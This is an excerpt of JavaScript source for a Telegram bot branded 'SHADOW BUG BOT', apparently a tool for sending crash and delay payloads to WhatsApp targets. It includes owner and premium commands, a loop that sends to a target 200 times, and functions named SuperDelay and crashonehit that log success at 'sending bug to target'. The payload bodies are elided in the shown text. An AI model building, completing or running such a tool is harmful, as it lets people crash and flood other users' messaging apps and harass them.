...
const CHANNEL_USERNAME = "@shadowfxjx"; // Telegram channel
const YT_LINK = "https://youtube.com/@shadowhere.460?si=4a7wHimrKXNHJeci";
const IG_LINK = "https://www.instagram.com/shadow76866?igsh=MTEydDF3ZXptMHNyNA==";
const WA_LINK = "https://whatsapp.com/channel/0029Vb7CCmzAu3aVUSEFw93z";
...
bot.onText(/\/start/, async (msg) => {
  ...
  // HTML use karne se underscores (@𝑺𝑯𝑨𝑫𝑶𝑾_𝒐𝒇𝒇𝒊𝒄𝒊𝒂𝒍error nahi denge
  const introMessage = `
┌───[ ⚡ 𝑺𝑯𝑨𝑫𝑶𝑾 BUG BOT  ]───┐
│ 𝐃𝐞𝐯: @Shadowhacrr
│ 𝐔𝐩𝐭: ${uptime}
...
`;
  ...
  await bot.sendPhoto(
    chatId,
    "https://i.ibb.co/hFcd1r2K/IMG-20260215-WA0118.jpg",
    {
...
const ADMIN_ID = "8408378910"; // Only this admin can broadcast
...
bot.onText(/\/listprem$/, async (msg) => {
  ...
  if (!isMainOwner(sender)) {
    return bot.sendMessage(
      chatId,
      "❌ *Only Developer 𝑺𝑯𝑨𝑫𝑶𝑾_𝒐𝒇𝒇𝒊𝒄𝒊𝒂𝒍 BUG BOT  can use this command!*",
      { parse_mode: "Markdown" }
    );
  }
...
bot.onText(/\/delpair(?:\s*(.+))?/, async (msg, match) => {
    ...
    const bannerImage = "https://i.ibb.co/hFcd1r2K/IMG-20260215-WA0118.jpg";
...
bot.onText(/\/addprem(?:\s+(\d+))?(?:\s+(\d+))?/, async (msg, match) => {
  ...
  if (!isMainOwner(msg.from.id.toString())) {
    return sendWithBanner("🚫 Only Developer 𝑺𝑯𝑨𝑫𝑶𝑾_𝒐𝒇𝒇𝒊𝒄𝒊𝒂𝒍 BUG BOT can use this command!");
  }
...
└──────────────┬─────────┘
                │
*POWERED BY 𝑺𝑯𝑨𝑫𝑶𝑾_𝒐𝒇𝒇𝒊𝒄𝒊𝒂𝒍 BUG BOT*
`);
  }
...
╚═════════════════╝`);
    ...
    for (let i = 0; i < 200; i++) {
      ...
      console.log(chalk.blueBright(`⚡ [${i + 1}/200] 𝑺𝑯𝑨𝑫𝑶𝑾_𝒐𝒇𝒇𝒊𝒄𝒊𝒂𝒍 BUG BOTCore sent to ${target}`));
    }
...
║
║ Only the developer
║ *𝑺𝑯𝑨𝑫𝑶𝑾_𝒐𝒇𝒇𝒊𝒄𝒊𝒂𝒍 BUG BOT* can use this command.
║
╚═══════════════════╝`);
  }
...
async function SuperDelay(sock, target, mention) {
  console.log(chalk.bold.red(`𝑺𝑯𝑨𝑫𝑶𝑾_𝒐𝒇𝒇𝒊𝒄𝒊𝒂𝒍 BUG BOT🐉 Success Sending Bug Delay ${target}`));
  let parse = true;
  let SID = "5e03e0&mms3";
...
async function crashonehit(sock, target) {
  ...
  try {
    ...
    console.log(chalk.red("⚠ 𝑺𝑯𝑨𝑫𝑶𝑾_𝒐𝒇𝒇𝒊𝒄𝒊𝒂𝒍 BUG BOT Succesfully sending bug to target"));
  } catch (error) {
...
console.log(chalk.red('𝑺𝑯𝑨𝑫𝑶𝑾_𝒐𝒇𝒇𝒊𝒄𝒊𝒂𝒍 BUG BOTBugBot V2 is running! 🚀'));